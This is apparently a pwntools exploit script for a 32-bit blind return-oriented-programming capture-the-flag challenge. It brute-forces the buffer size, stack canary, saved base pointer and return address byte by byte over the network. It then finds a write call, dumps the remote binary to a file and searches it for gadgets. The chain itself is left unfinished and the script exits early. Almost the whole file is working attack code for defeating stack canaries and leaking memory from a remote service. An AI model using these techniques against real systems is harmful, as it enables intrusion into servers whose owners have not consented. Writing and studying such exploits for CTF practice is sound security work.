#!/usr/bin/env python2.7
from pwn import *
import os
import pickle
import sys

HOST = 'challenge.pwny.racing'
PORT = 11542

if len(sys.argv) > 1:
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

# attack plan: the attack here is easier than the 64bit version of a brop challenge
#              because arguments are passed on the stack, so you just need to use an
#              oracle and brute force as much stack data as possible (a return addr,
#              saved base pointer, perhaps some alignment bytes and sometimes a ref
#              to a FILE *) and then after that you can use pure deduction to figure
#              out what the output function is and therefor how to use it in order
#              to dump enough of the raw binary to know what functions are where.


def save(label, record):

	data = load()
	if data is None:
		data = {}

	data[label] = record

	with open('cache.pickle', 'wb') as f:
		pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)


def load(label=None):

	if os.path.exists('cache.pickle'):
		with open('cache.pickle', 'rb') as f:
			data = pickle.load(f)

			if label:
				if label in data:
					return data[label]
			else:
				return data

	return None


def dump(prefix, size, label='data'):

	data = load(label)
	if data is None:

		data = ''
		while len(data) < size:
			for c in range(0x100):

				if c == 0x0a:
					continue

				try:

					byte = chr(c)

					log.info('trying: 0x%02x at position %d (%s: %s)' % (c, len(data), label, data.encode('hex')))
					io = remote(HOST, PORT)

					io.recvuntil(': ')
					io.sendline(prefix+data+byte)
					line = io.recvline()
					io.close()

					if 'darkest' in line:
						data += byte
						log.success('%s: %s' % (label, data.encode('hex')))
						break

				except:
					io.close()

		save(label, data)

	return data


# step 1: find the size of the buffer
size = load('size')
if size is None:
	for i in range(0x08, 0x200):
		try:
			io = remote(HOST, PORT)

			if i == 0:
				print io.recvuntil('\nbuf')[:-5]

			log.info('size: %d?' % i)
			io.recvuntil(': ')
			io.sendline('x'*i)
			io.recvline()
			io.close()

		except:

			io.close()

			size = i-1
			save('size', size)
			break

# setup the prefix we will append data to as we go
prefix  = 'x'*size

# dump the canary
canary  = dump(prefix, 4, 'canary')
prefix += canary
canary  = u32(canary)

log.success('canary: 0x%08x' % canary)

# dump the .data section pointer
ddata   = dump(prefix, 4, '.data')
prefix += ddata
ddata   = u32(ddata)

log.success('.data:  0x%08x' % ddata)

# dump alignment bytes
prefix += dump(prefix, 4, 'align')

# dump the saved base pointer
ebp     = dump(prefix, 4, 'ebp')
prefix += ebp
ebp     = u32(ebp)

log.success('stack:  0x%08x' % ebp)

# dump the saved instruction pointer
ret     = dump(prefix, 4, 'ret')
#prefix += ret
ret     = u32(ret)

log.success('return: 0x%08x' % ret)

# hunt down a way to leak the binary, we pass arguments on the stack so it
# is fairly easy to just look for a write or send call (similar args) with
# a known address.

addr = load('addr')
if addr is None:
	for i in range(-256, 256):
		try:
			io = remote(HOST, PORT)

			addr = ret+i
			log.info('addr: 0x%08x' % (addr))
			io.recvuntil(': ')
			io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000)+p32(0x100))
			line = io.recvline()

			io.close()
			
			if 'ELF' in line:
				save('addr', addr)
				break

		except:

			io.close()

log.success('write: 0x%08x' % addr)

data = ''
for i in range(0, 0x100000, 0x1000):
	try:
		io = remote(HOST, PORT)

		log.info('dumping: 0x%08x' % (addr+i))
		io.recvuntil(': ')
		io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000+i)+p32(0x1000))
		chunk = io.recvn(0x1000)

		data += chunk

		if len(chunk) < 0x1000:
			break

		io.close()

	except:

		io.close()

with open('dump.bin', 'wb') as f:
	f.write(data)
	log.success('wrote %d bytes to %s' % (len(data), 'dump.bin'))

# now lets hunt for gadgets
gadgets = [
    { 'opcode': '\x58\xc3',     'mnemonic': 'pop eax; ret',            'addr': 0 },
    { 'opcode': '\x59\x5b\xc3', 'mnemonic': 'pop ecx ; pop ebx ; ret', 'addr': 0 },
    { 'opcode': '\x5a\xc3',     'mnemonic': 'pop edx; ret',            'addr': 0 },
    { 'opcode': '\xcd\x80\xc3', 'mnemonic': 'int 0x80; ret',           'addr': 0 },
]

found = 0
for gadget in gadgets:
    index = data.find(gadget['opcode'])
    if index != -1:
        gadget['addr'] = 0x08048000+index
        found += 1

if len(gadgets) != found:
	log.error('could not find all gadgets')


for gadget in gadgets:
	log.info('gadget: %s => 0x%08x' % (gadget['mnemonic'], gadget['addr']))

# build the rop chain
#rop  = p32()

sys.exit(0)
io.interactive()